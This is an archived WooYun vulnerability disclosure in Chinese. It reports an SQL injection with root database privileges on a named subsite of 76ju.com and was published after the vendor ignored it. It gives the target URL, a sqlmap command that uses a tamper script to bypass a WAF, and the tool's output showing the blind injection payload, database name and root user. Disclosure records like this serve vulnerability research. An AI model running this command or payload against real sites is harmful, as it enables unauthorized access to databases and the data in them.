wybug_title: 齐乐聚某分站SQL注入/root权限
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-11-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-01-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：   详细说明：  
http://tt.76ju.com/?action=detail&id=6171-0

检测的时候发现可注，但是跑不出内.然后调试一下发现存在WAF，然后找了对应的tamper进行绕过.

sqlmap.py -u "http://tt.76ju.com/?action=detail&id=6171-0" --current-user --no-cast --threads=5 -v 5 --tamper=between





sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: action=detail&id=6171-0) AND 3340=3340 AND (8832=8832    Vector: AND [INFERENCE]---web application technology: Nginxback-end DBMS: MySQL 5current database:    '76jutest'sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: action=detail&id=6171-0) AND 3340=3340 AND (8832=8832---web application technology: Nginxback-end DBMS: MySQL 5current user:    'root@127.0.0.1'
   漏洞证明：     修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
